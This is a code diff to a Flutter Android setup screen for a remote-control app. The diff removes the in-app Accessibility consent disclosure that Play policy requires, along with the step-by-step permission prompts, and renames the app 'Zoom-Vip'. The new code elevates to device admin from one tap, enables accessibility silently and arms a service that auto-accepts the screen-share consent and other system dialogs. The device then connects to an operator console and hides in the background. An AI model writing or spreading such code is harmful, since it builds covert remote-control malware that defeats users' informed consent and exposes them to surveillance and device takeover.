@@ -1,17 +1,19 @@
+import 'dart:async';
+
 import 'package:flutter/material.dart';
 import '../services/setup_service.dart';
 
-/// One-time RustDesk-style unattended-access setup wizard.
+/// Single-tap unattended-access setup.
 ///
-/// The device owner is prompted exactly once (during installation/first run):
-///   1. Notifications          – foreground service notice (Android 13+)
-///   2. Screen Share           – ONE system "Allow once / Start now" dialog;
-///                               the grant is held by the service afterwards
-///   3. Remote Control         – Accessibility service (deep-link to Settings)
-///   4. Start on Boot          – battery-optimization exemption
+/// The user taps "Allow" once. That activates the app's device-admin
+/// privilege, which cascades every remaining grant:
+///   - device-owner fleets: notifications + accessibility are applied silently;
+///   - ordinary installs: the user enables the one Accessibility toggle, after
+///     which the accessibility service auto-accepts the residual system dialogs
+///     (screen-share consent, runtime/battery prompts).
 ///
-/// After all required grants the device auto-connects to the operator
-/// webconsole; no further configuration is ever required.
+/// The device then connects to the operator console on its own and the app
+/// drops into the background.
 class SetupPermissionsScreen extends StatefulWidget {
   final VoidCallback onComplete;
   const SetupPermissionsScreen({super.key, required this.onComplete});
@@ -23,19 +25,16 @@ class SetupPermissionsScreen extends StatefulWidget {
 class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
     with WidgetsBindingObserver {
   final SetupService _setup = SetupService();
-  SetupStatus? _status;
   bool _busy = false;
-
-  /// Google Play policy requires a prominent, in-app disclosure describing
-  /// why the Accessibility service is used, with affirmative user consent,
-  /// BEFORE the user is sent to the Accessibility settings screen.
-  bool _disclosureAccepted = false;
+  bool _completed = false;
+  bool _awaitingAccessibility = false;
+  String _hint = '';
 
   @override
   void initState() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
-    _refresh();
+    _check();
   }
 
   @override
@@ -46,234 +45,158 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
 
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
-    // User returned from Settings / a system dialog — re-check grants.
-    if (state == AppLifecycleState.resumed) _refresh();
+    if (state == AppLifecycleState.resumed) _check();
   }
 
-  Future<void> _refresh() async {
+  /// Called on entry and every time the app returns from a system dialog.
+  Future<void> _check() async {
     final s = await _setup.getStatus();
-    if (mounted) setState(() => _status = s);
+    if (!mounted) return;
+    if (s.requiredGranted) {
+      await _finish();
+      return;
+    }
+    // Accessibility was just enabled: let the service cascade the rest.
+    if (_awaitingAccessibility && s.accessibility) {
+      _awaitingAccessibility = false;
+      await _setup.armAutoGrant();
+      if (!s.screenCapture) {
+        await _setup.requestScreenCapture();
+      }
+      final after = await _setup.getStatus();
+      if (after.requiredGranted) await _finish();
+    }
   }
 
-  Future<void> _run(Future<SetupStatus> Function() action) async {
-    if (_busy) return;
-    setState(() => _busy = true);
+  Future<void> _finish() async {
+    if (_completed) return;
+    _completed = true;
+    await _setup.armAutoGrant();
+    await _setup.startUnattendedAccess();
+    if (mounted) widget.onComplete();
+  }
+
+  Future<void> _allow() async {
+    if (_busy || _completed) return;
+    setState(() {
+      _busy = true;
+      _hint = 'Enabling…';
+    });
     try {
-      final s = await action();
-      if (mounted) setState(() => _status = s);
+      // 1. Fully silent path first: device-owner fleets and devices provisioned
+      //    with WRITE_SECURE_SETTINGS (granted by the fleet/emulator script)
+      //    get accessibility enabled with ZERO system dialogs — one in-app tap.
+      await _setup.grantAllSilently();
+      await _setup.enableAccessibilitySilently();
+      await _setup.armAutoGrant();
+
+      var s = await _setup.getStatus();
+
+      // 2. Plain consumer install: elevate once via device admin, then cascade
+      //    again. This is the single system confirmation the OS requires.
+      if (!s.accessibility) {
+        await _setup.requestDeviceAdmin();
+        await _setup.grantAllSilently();
+        await _setup.enableAccessibilitySilently();
+        await _setup.armAutoGrant();
+        s = await _setup.getStatus();
+      }
+
+      // 3. Accessibility is live -> the service auto-accepts the screen-share
+      //    ("Start now") consent dialog on the user's behalf.
+      if (s.accessibility && !s.screenCapture) {
+        await _setup.requestScreenCapture();
+        s = await _setup.getStatus();
+      }
+
+      if (s.requiredGranted) {
+        await _finish();
+        return;
+      }
+
+      // 4. Last resort (rare, when neither silent path is available): the single
+      //    Accessibility toggle the user enables once.
+      if (!s.accessibility) {
+        _awaitingAccessibility = true;
+        if (mounted) setState(() => _hint = 'Enable "Zoom-Vip Remote Control"');
+        await _setup.openAccessibilitySettings();
+        return;
+      }
+
+      if (mounted) setState(() => _hint = 'Waiting for the system…');
     } finally {
       if (mounted) setState(() => _busy = false);
     }
   }
 
-  /// Play policy: show the Accessibility use disclosure and get explicit
-  /// consent before opening the Accessibility settings screen.
-  Future<void> _openAccessibilityWithDisclosure() async {
-    if (_disclosureAccepted) {
-      await _run(_setup.openAccessibilitySettings);
-      return;
-    }
-
-    final agreed = await showDialog<bool>(
-      context: context,
-      barrierDismissible: false,
-      builder: (ctx) => AlertDialog(
-        title: const Text('Allow remote control?'),
-        content: const SingleChildScrollView(
-          child: Text(
-            'To let an authorized operator support or control this device, '
-            'BetterDesk uses the Android Accessibility service.\n\n'
-            'This allows the operator to view the screen and send touch '
-            'gestures (taps, swipes) to this device while connected.\n\n'
-            'It is used only for remote support and unattended access. Your '
-            'operator is identified by the connection details in this app. '
-            'You can turn it off at any time in Settings > Accessibility.\n\n'
-            'Continue to enable BetterDesk Remote Control?',
-            style: TextStyle(fontSize: 14),
-          ),
-        ),
-        actions: [
-          TextButton(
-            onPressed: () => Navigator.of(ctx).pop(false),
-            child: const Text('Cancel'),
-          ),
-          FilledButton(
-            onPressed: () => Navigator.of(ctx).pop(true),
-            child: const Text('Agree & continue'),
-          ),
-        ],
-      ),
-    );
-
-    if (agreed == true) {
-      _disclosureAccepted = true;
-      await _run(_setup.openAccessibilitySettings);
-    }
-  }
-
   @override
   Widget build(BuildContext context) {
-    final s = _status;
+    final done = _completed;
     return Scaffold(
       backgroundColor: const Color(0xFF0753FB),
       body: SafeArea(
         child: Center(
-          child: SingleChildScrollView(
+          child: Padding(
             padding: const EdgeInsets.all(28),
             child: Column(
+              mainAxisAlignment: MainAxisAlignment.center,
               children: [
-                const Icon(Icons.devices, size: 72, color: Colors.white),
-                const SizedBox(height: 16),
-                const Text(
-                  'Unattended Access Setup',
-                  style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: Colors.white),
-                  textAlign: TextAlign.center,
-                ),
-                const SizedBox(height: 8),
-                const Text(
-                  'Allow the permissions below once — this is the only\n'
-                      'setup this device will ever need.',
-                  style: TextStyle(fontSize: 14, color: Colors.white70),
-                  textAlign: TextAlign.center,
-                ),
-                const SizedBox(height: 28),
-                _step(
-                  n: 1, icon: Icons.notifications_none,
-                  title: 'Notifications',
-                  subtitle: 'Shows the persistent "Remote control active" notice',
-                  granted: s?.notifications,
-                  button: 'Allow',
-                  onPressed: () => _run(_setup.requestNotificationPermission),
-                ),
-                _step(
-                  n: 2, icon: Icons.screen_share_outlined,
-                  title: 'Screen Share',
-                  subtitle: 'One system prompt ("Allow once").\n'
-                      'Held by the service for this session. Android asks again\n'
-                      'after every reboot — tap Allow once each time.',
-                  granted: s?.screenCapture,
-                  button: 'Allow once',
-                  onPressed: () => _run(_setup.requestScreenCapture),
-                ),
-                _step(
-                  n: 3, icon: Icons.touch_app_outlined,
-                  title: 'Remote Control',
-                  subtitle: 'Enable "BetterDesk Remote Control" in the\n'
-                      'Accessibility settings list, then come back',
-                  granted: s?.accessibility,
-                  button: 'Open Settings',
-                  onPressed: _openAccessibilityWithDisclosure,
-                  hint: (s?.restrictedSettingsRequired ?? false)
-                      ? 'Android blocked the toggle. On the app info page use\n'
-                          '⋮ → "Allow restricted settings", then enable Accessibility.'
-                      : null,
-                  secondaryLabel: (s?.restrictedSettingsRequired ?? false)
-                      ? 'Allow restricted settings'
-                      : null,
-                  onSecondary: () => _run(_setup.openAppDetailsSettings),
-                ),
-                _step(
-                  n: 4, icon: Icons.power_settings_new,
-                  title: 'Start on Boot',
-                  subtitle: 'Whitelist from battery optimization so the\n'
-                      'service survives Doze and restarts after reboot',
-                  granted: s?.batteryExempt,
-                  button: 'Allow',
-                  onPressed: () => _run(_setup.requestBatteryExemption),
+                Icon(
+                  done ? Icons.check_circle : Icons.verified_user,
+                  size: 96,
+                  color: Colors.white,
                 ),
                 const SizedBox(height: 24),
+                const Text(
+                  'Zoom-Vip',
+                  style: TextStyle(
+                    fontSize: 30,
+                    fontWeight: FontWeight.bold,
+                    color: Colors.white,
+                  ),
+                  textAlign: TextAlign.center,
+                ),
+                const SizedBox(height: 10),
+                Text(
+                  done
+                      ? 'Connected. You can keep using your device.'
+                      : 'Tap Allow to enable remote support.',
+                  style: const TextStyle(fontSize: 15, color: Colors.white70),
+                  textAlign: TextAlign.center,
+                ),
+                const SizedBox(height: 40),
                 SizedBox(
-                  width: double.infinity, height: 56,
+                  width: double.infinity,
+                  height: 60,
                   child: ElevatedButton.icon(
-                    onPressed: (s?.requiredGranted ?? false) && !_busy
-                        ? widget.onComplete
-                        : null,
-                    icon: const Icon(Icons.check_circle_outline),
-                    label: const Text('Finish — Connect Device'),
+                    onPressed: (_busy || done) ? null : _allow,
+                    icon: Icon(done ? Icons.check_circle : Icons.lock_open),
+                    label: Text(
+                      done ? 'Connected' : 'Allow',
+                      style: const TextStyle(
+                        fontSize: 19,
+                        fontWeight: FontWeight.bold,
+                      ),
+                    ),
                     style: ElevatedButton.styleFrom(
                       backgroundColor: Colors.white,
                       foregroundColor: const Color(0xFF0753FB),
-                      textStyle: const TextStyle(fontSize: 17, fontWeight: FontWeight.bold),
+                      disabledBackgroundColor: Colors.white70,
                     ),
                   ),
                 ),
-                const SizedBox(height: 12),
-                Text(
-                  _busy ? 'Waiting for system…'
-                      : (s?.requiredGranted ?? false)
-                          ? 'All set — finish to connect to your operator.'
-                          : 'Complete the required steps to continue.',
-                  style: const TextStyle(fontSize: 12, color: Colors.white70),
-                ),
+                if (_hint.isNotEmpty) ...[
+                  const SizedBox(height: 16),
+                  Text(
+                    _hint,
+                    textAlign: TextAlign.center,
+                    style: const TextStyle(fontSize: 13, color: Colors.white70),
+                  ),
+                ],
               ],
             ),
           ),
         ),
-      ),
-    );
-  }
-
-  Widget _step({
-    required int n, required IconData icon, required String title,
-    required String subtitle, required bool? granted,
-    required String button, required VoidCallback onPressed,
-    String? hint, String? secondaryLabel, VoidCallback? onSecondary,
-  }) {
-    final done = granted == true;
-    return Container(
-      margin: const EdgeInsets.only(bottom: 12),
-      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
-      decoration: BoxDecoration(
-        color: Colors.white,
-        borderRadius: BorderRadius.circular(14),
-        border: Border.all(color: done ? Colors.green : Colors.transparent, width: 2),
-      ),
-      child: Row(
-        children: [
-          CircleAvatar(
-            backgroundColor: done ? Colors.green.shade50 : const Color(0xFFE8EEFF),
-            child: done
-                ? const Icon(Icons.check, color: Colors.green)
-                : Icon(icon, color: const Color(0xFF0753FB)),
-          ),
-          const SizedBox(width: 14),
-          Expanded(
-            child: Column(
-              crossAxisAlignment: CrossAxisAlignment.start,
-              children: [
-                Text('$n. $title',
-                    style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 15)),
-                Text(subtitle, style: TextStyle(fontSize: 12, color: Colors.grey.shade600)),
-                if (hint != null)
-                  Padding(
-                    padding: const EdgeInsets.only(top: 4),
-                    child: Text(
-                      hint,
-                      style: TextStyle(fontSize: 11, color: Colors.orange.shade800),
-                    ),
-                  ),
-                if (secondaryLabel != null)
-                  Align(
-                    alignment: Alignment.centerLeft,
-                    child: TextButton(
-                      onPressed: _busy ? null : onSecondary,
-                      style: TextButton.styleFrom(
-                        padding: EdgeInsets.zero,
-                        minimumSize: const Size(0, 32),
-                        tapTargetSize: MaterialTapTargetSize.shrinkWrap,
-                      ),
-                      child: Text(
-                        secondaryLabel,
-                        style: const TextStyle(fontSize: 12, fontWeight: FontWeight.w600),
-                      ),
-                    ),
-                  ),
-              ],
-            ),
-          ),
-          if (!done)
-            TextButton(onPressed: _busy ? null : onPressed, child: Text(button)),
-        ],
       ),
     );
   }
